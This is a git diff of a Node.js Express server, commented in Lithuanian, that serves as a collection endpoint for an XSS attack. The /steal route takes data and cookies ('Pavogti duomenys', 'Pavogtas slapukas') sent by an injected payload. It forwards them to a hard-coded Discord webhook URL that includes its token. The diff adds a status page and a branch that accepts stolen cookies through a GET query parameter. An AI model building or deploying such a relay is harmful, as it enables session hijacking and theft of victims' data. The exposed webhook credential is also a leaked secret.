@@ -2,12 +2,17 @@
 const express = require('express');
 const app = express();
 
-// Discord webhook URL - įkelk SAVO URL čia
+// Discord webhook URL - tavo pateiktas webhook
 const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1496932097246499090/__PgEXEetM1ZSv02o5i9xx69kgkNrjaaaQsmmKm4c8ORZKggHhuxzu_yDrg-FfXB6D2H';
 
 // Middleware, kuris leidžia skaityti JSON ir tekstą iš užklausų
 app.use(express.json());
 app.use(express.text());
+
+// Pagrindinis puslapis – kad nerodytų "Cannot GET /"
+app.get('/', (req, res) => {
+  res.send('Proxy serveris veikia! Naudok POST /steal');
+});
 
 // Čia serveris priima visas POST užklausas iš XSS payload'o
 app.post('/steal', async (req, res) => {
@@ -20,6 +25,10 @@ app.post('/steal', async (req, res) => {
   // Jei ne JSON, tai tikriausiai tiesiog tekstas
   else if (typeof req.body === 'string') {
     dataToSend = `📄 **Pavogti duomenys**: ${req.body}`;
+  }
+  // Taip pat gali gauti per query parametrą (GET užklausa)
+  else if (req.query && req.query.c) {
+    dataToSend = `🍪 **Pavogtas slapukas (GET)**: ${req.query.c}`;
   }
 
   // Jei gauti duomenys, siunčiame juos į Discord webhook'ą
